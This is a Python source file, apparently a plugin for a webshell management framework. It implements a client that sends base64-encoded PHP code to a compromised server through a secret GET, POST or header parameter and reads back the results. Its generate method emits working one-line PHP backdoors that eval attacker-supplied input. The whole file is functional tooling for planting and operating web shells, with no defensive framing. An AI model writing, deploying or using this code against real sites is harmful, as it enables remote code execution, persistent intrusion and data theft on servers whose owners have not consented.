from api.webshell import Webshell, WebshellSession, CodeExecuteError, PHPWebshell, EvalResult
from api import logger, utils, PHPPayload, Request, HttpException
import random
import re
import os
import base64
import json
import string

class webshell(PHPWebshell):

    def __init__(self):
        super().__init__()
        self.options.add_option('password', 'You need use this password to connect webshell server.', True, 'c', check=r'[\w\-]+')
        self.options.add_option('password_type', 'Password type like GET, POST or HEADER.If not set, will use POST type to connect server(server must use this type).',
            default='POST', check=r'(?i)GET|POST|HEADER')

        self.opener = Request()

    def connect(self)-> bool:
        '''connect target and return True, or False if connect failed. 
        '''
        num = random.randint(10000, 9999999999999)
        p = PHPPayload()
        p.from_string(f'echo {num};')
        recv = self.eval(p)
        if not recv.is_success():
            logger.error("Connect error!")
            return False
        if recv.data != str(num):
            print(f'\nRecv: {recv.data}\nExpect: {num}')
            logger.error('Server reply a incorrect answer!')
            return False
        return True

    @Webshell.handle_evaled
    def eval(self, payload: PHPPayload)->EvalResult:
        '''执行payload并获取返回结果'''
        password_type = self.options.password_type.upper()
        payload_param_name = utils.randomstr(8)

        payload = base64.b64encode(payload.code).decode()
        trans_payload = PHPPayload('transfer.php', payload_param_name=payload_param_name).code.decode()

        data = {payload_param_name:payload}
        headers = {}
        query = {}
        if password_type == 'POST':
            data[self.options.password] = trans_payload
        elif password_type == 'GET':
            query[self.options.password] = trans_payload
        elif password_type == 'HEADER':
            trans_payload = trans_payload.replace('\r', '').replace('\n', '') # 头部传输时消除换行
            headers.update({self.options.password:trans_payload})
        
        result = EvalResult()
        try:
            with self.opener.reuqest(self.options.target, data=data, headers=headers, params=query, timeout=self.options.timeout) as f:
                data = f.read()
                data = json.loads(data)
                if not self._error_handler(data, result):
                    return result
                data = base64.b64decode(data['data'].encode()).decode(self.options.encoding, 'ignore')
                result.data = data
                return result
        except json.JSONDecodeError as e:
            err = self.EvalError(e.__class__.__name__, e.msg, False, False)
            result.add_error_info(err)
            if self.options.verbose > 0:
                logger.error(err)
                print(f"Error data: {data}")
        except HttpException as e:
            err = self.EvalError('HttpException', f"{e.msg};Response: {e.response.read().decode(self.options.encoding, 'ignore')}", False, False)
            result.add_error_info(err)
            if self.options.verbose > 1:
                logger.error(err)
        except Exception as e:
            err = self.EvalError(e.__class__.__name__, str(e), False, False)
            result.add_error_info(err)
            if self.options.verbose > 0:
                logger.error(err)

        return result

    def _error_handler(self, error: dict, result: EvalResult)-> bool:
        '''处理webshell返回的错误信息
        '''
        if error['code'] != 1:
            for msg in error['msg']:
                code = self._to_php_errcode(msg.get('errcode'))
                err = self.EvalError(code, base64.b64decode(msg.get('errmsg').encode()).decode(self.options.encoding, 'ignore'), 
                    True if error['code'] == 0 or msg.get('iswarning') else False, True)
                result.add_error_info(err)
                if err.iswarning and self.options.verbose > 1:
                    logger.warning(err)
                elif not err.iswarning and self.options.verbose > 0:
                    logger.error(err)
            if error['code'] == -1:
                return False
        return True

    def generate(self)-> bytes:
        '''生成并返回webshell代码'''
        if self.options.password_type.upper() == 'HEADER':
            return f"<?php @eval($_SERVER['{self.options.password}']);?>".encode()
        elif self.options.password_type.upper() == 'GET':
            return f"<?php @eval($_GET['{self.options.password}']);?>".encode()
        else:
            return f"<?php @eval($_POST['{self.options.password}']);?>".encode()

